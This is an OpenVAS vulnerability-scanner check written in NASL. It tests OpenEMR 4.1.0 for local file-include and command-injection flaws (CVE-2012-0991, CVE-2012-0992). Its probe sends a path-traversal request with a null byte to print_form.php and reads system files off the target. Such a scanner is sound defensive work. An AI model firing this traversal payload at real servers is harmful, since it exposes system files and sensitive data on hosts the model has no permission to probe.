###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openemr_51788.nasl 11003 2018-08-16 11:08:00Z asteins $
#
# OpenEMR Local File Include and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103410");
  script_bugtraq_id(51788);
  script_cve_id("CVE-2012-0991", "CVE-2012-0992");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_version("$Revision: 11003 $");

  script_name("OpenEMR Local File Include and Command Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51788");
  script_xref(name:"URL", value:"http://www.open-emr.org/");
  script_xref(name:"URL", value:"http://www.open-emr.org/wiki/index.php/OpenEMR_Patches");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521448");

  script_tag(name:"last_modification", value:"$Date: 2018-08-16 13:08:00 +0200 (Thu, 16 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-02-02 12:55:39 +0100 (Thu, 02 Feb 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_openemr_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openemr/installed");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
  script_tag(name:"summary", value:"OpenEMR is prone to local file-include and command-injection
vulnerabilities because it fails to properly sanitize user-
supplied input.");

  script_tag(name:"impact", value:"A remote attacker can exploit these issues to execute arbitrary shell
commands with the privileges of the user running the application,
obtain potentially sensitive information, and execute arbitrary local
scripts in the context of the Web server process. This could allow the
attacker to compromise the application and the computer - other attacks
are also possible.");

  script_tag(name:"affected", value:"OpenEMR 4.1.0 is vulnerable - other versions may also be affected.");
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

if(!dir = get_dir_from_kb(port:port,app:"OpenEMR"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/contrib/acog/print_form.php?formname=",crap(data:"../",length:6*9),files[file],"%00");
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    security_message(port:port);
  }

}

exit(0);
